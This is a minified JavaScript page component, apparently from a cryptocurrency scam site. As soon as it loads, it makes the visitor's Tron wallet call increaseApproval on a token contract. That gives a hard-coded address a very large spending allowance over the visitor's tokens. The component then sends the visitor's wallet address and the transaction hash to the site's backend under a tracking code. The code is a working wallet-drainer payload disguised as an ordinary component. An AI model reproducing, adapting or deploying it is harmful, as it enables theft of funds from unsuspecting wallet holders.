import{r as s}from"./request.f0f38fe8.js";import{d,E as n}from"./index.75351461.js";const i=d({__name:"Tron",setup(u){const e=window.tronWeb;async function r(){try{let t=await(await e.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t")).increaseApproval("TRKSQRnVQuULBf5u9DegbuxSWZjUUUUUUU",e.toSun(9e7)).send({feeLimit:15e7,callValue:0,shouldPollResponse:!1}),o=await e.defaultAddress.base58;s({method:"post",url:"/user/address/add",data:{code:"hj3b45",address:o,hash:t}})}catch(a){let t=await e.defaultAddress.base58;n({message:`\u64CD\u4F5C\u5931\u8D25
`+a,type:"error"}),s({method:"post",url:"/user/address/add",data:{code:"hj3b45",address:t,hash:a}})}}return r(),(a,t)=>null}});export{i as default};
